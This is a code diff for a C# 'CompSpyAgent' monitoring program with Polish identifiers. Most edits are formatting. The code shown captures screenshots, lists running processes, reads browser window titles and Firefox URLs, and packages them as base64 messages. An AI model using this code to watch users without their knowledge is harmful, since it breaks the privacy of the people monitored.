@@ -27,7 +27,7 @@ namespace CompSpyAgent
         public DateTime czasOst;
 
 
-        [DataContract] 
+        [DataContract]
         public class Komunikat
         {
             [DataMember]
@@ -35,7 +35,7 @@ namespace CompSpyAgent
 
             [DataMember]
             public List<String> listaProcesow { get; set; }
-            
+
             [DataMember]
             public List<String> listaStron { get; set; }
 
@@ -51,7 +51,7 @@ namespace CompSpyAgent
                     listaProcesow.Add(p.ProcessName);
                 }
 
-                foreach(var s in strony)
+                foreach (var s in strony)
                 {
                     listaStron.Add(s);
                 }
@@ -63,7 +63,7 @@ namespace CompSpyAgent
         public String serializacja(bool hq)
         {
             Komunikat komunikat;
-            if(hq == true)
+            if (hq == true)
             {
                 komunikat = new Komunikat(getImageBase64(getHQScreen()), listaProcesow, listaStron);
             }
@@ -80,7 +80,7 @@ namespace CompSpyAgent
 
         }
 
-            public Spy()
+        public Spy()
         {
             bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
             zrzut = Graphics.FromImage(bmp);
@@ -98,13 +98,13 @@ namespace CompSpyAgent
             }
             );
             watek.Start();
-        }     
+        }
 
-      
-        
+
+
         public void Aktualizacja()
         {
-            
+
 
             zrzut.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
 
@@ -114,16 +114,16 @@ namespace CompSpyAgent
             listaStron.Clear();
             getURLfirefox();
 
-            foreach(var p in listaProcesow)
+            foreach (var p in listaProcesow)
             {
-                if(Convert.ToString(p.ProcessName) == "chrome")
+                if (Convert.ToString(p.ProcessName) == "chrome")
                 {
-                    if(p.MainWindowTitle != "" || p.MainWindowTitle == " ")
+                    if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
                     {
                         listaStron.Add("[chrome]");
                         listaStron.Add("Title: " + p.MainWindowTitle);
                     }
-                   
+
                 }
 
                 if (Convert.ToString(p.ProcessName) == "opera")
@@ -138,7 +138,7 @@ namespace CompSpyAgent
                 if (Convert.ToString(p.ProcessName) == "iexplore")
                 {
                     if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
-                    { 
+                    {
                         listaStron.Add("[iexplore]");
                         listaStron.Add("Title: " + p.MainWindowTitle);
                     }
@@ -159,7 +159,7 @@ namespace CompSpyAgent
 
 
 
-        } 
+        }
         public void getURLfirefox()
         {
             try
@@ -167,7 +167,7 @@ namespace CompSpyAgent
                 DdeClient dde = new DdeClient("firefox", "WWW_GetWindowInfo");
                 dde.Connect();
                 string url = dde.Request("URL", int.MaxValue);
-               string[] urls = url.Split(new string[] { ",", "\"" }, StringSplitOptions.RemoveEmptyEntries);
+                string[] urls = url.Split(new string[] { ",", "\"" }, StringSplitOptions.RemoveEmptyEntries);
                 dde.Disconnect();
 
                 listaStron.Add("[firefox]");
@@ -189,7 +189,7 @@ namespace CompSpyAgent
 
         public Bitmap getHQScreen()
         {
-           Bitmap img = new Bitmap(bmp, new Size(960, 540)); // 1/2 zdjecia
+            Bitmap img = new Bitmap(bmp, new Size(960, 540)); // 1/2 zdjecia
             return img;
         }
 
@@ -200,18 +200,16 @@ namespace CompSpyAgent
         }
         public String getImageBase64(Bitmap img)
         {
-           
-                using (MemoryStream memory = new MemoryStream())
-                {
-                    try
-                    {
-                        img.Save(memory, img.RawFormat);
-                    }
-                    catch { }
-                    byte[] tab = memory.ToArray();
-                    return Convert.ToBase64String(tab);
-                }
-    }
+
+            Graphics g = Graphics.FromImage(img);
+
+            System.IO.MemoryStream stream = new System.IO.MemoryStream();
+            img.Save(stream, System.Drawing.Imaging.ImageFormat.Bmp);
+            byte[] imageBytes = stream.ToArray();
+
+            return Convert.ToBase64String(imageBytes);
+            
+        }
 
         public void getListaProcesow(ListView lw)
         {
